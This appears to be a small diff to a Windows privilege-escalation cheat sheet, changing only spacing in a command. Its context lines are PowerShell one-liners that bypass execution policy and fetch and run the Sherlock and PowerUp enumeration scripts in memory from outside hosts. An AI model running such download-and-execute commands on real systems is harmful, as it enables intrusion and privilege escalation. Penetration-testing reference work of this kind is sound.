@@ -187,7 +187,7 @@ REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 # For older Systems use Sherlock
 powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"
 
 ```
 
